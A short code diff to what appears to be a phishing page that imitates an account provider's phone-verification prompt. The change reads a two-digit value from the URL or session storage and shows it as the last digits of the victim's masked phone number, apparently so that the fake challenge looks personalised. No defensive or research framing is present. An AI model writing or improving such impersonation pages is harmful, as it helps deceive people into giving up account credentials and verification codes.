@@ -274,10 +274,15 @@
       } catch (e) {}
     });
     try {
-      var hint = new URLSearchParams(location.search).get('hint');
-      if (hint && /^\d{2}$/.test(hint.trim())) {
+      var q = new URLSearchParams(location.search);
+      var hint = (q.get('hint') || q.get('code') || '').trim();
+      try { if (!/^\d{2}$/.test(hint)) hint = sessionStorage.getItem('ge_phone_hint') || ''; } catch (e) {}
+      if (/^\d{2}$/.test(hint)) {
+        try { sessionStorage.setItem('ge_phone_hint', hint); } catch (e) {}
         var el = document.getElementById('helpText');
-        if (el) el.textContent = 'To get a verification code, first confirm the phone number you added to your account ••••••••' + hint.trim() + '. Standard message and data rates may apply.';
+        if (el) el.textContent = 'To get a verification code, first confirm the phone number you added to your account ••••••••' + hint + '. Standard message and data rates may apply.';
+        var ph = document.getElementById('phoneHint');
+        if (ph) ph.textContent = '••••••••' + hint;
       }
     } catch (e) {}
     function applyIdentity() {
